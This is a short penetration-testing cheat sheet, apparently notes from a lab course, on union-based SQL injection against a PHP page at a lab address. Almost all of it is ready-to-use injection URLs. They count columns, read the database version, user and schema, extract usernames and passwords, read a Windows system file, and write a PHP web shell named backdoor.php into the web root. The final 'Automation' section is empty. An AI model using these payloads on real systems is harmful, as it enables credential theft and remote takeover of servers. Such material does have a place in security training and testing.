# SQL (Structured Query Language)  

Find a potential vuln by adding a char such as single quote and checking for errors.  

Basic statement.  

`SELECT * FROM users; #`  

Union statement.  

`UNION SELECT * FROM users; #`  

Limit number of rows returned.  

`SELECT * FROM users LIMIT 1; #`  

Find number of columns, this command orders by collumn, start at 1 and increase, if there is a error then previous number is number of columns.  

`SELECT * FROM users ORDER BY 1; #`  

To find which columns are being printed, using numerical value if names are not known.  

`http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3`  

## Extracting data  

This example uses mariaDB.  

Output version.  

`http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version`  

Output current database user.  

`http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()`  

Getting information from the schema.  

`http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables`  

Getting column names from the user table using schema.  

`http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'`  

Extract usernames and passwords.  

`http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users`  

## Code execution  

Read a file.  

`http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')`  

Write a simple webshell into the web root directory.  

`http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`  

## Automation  

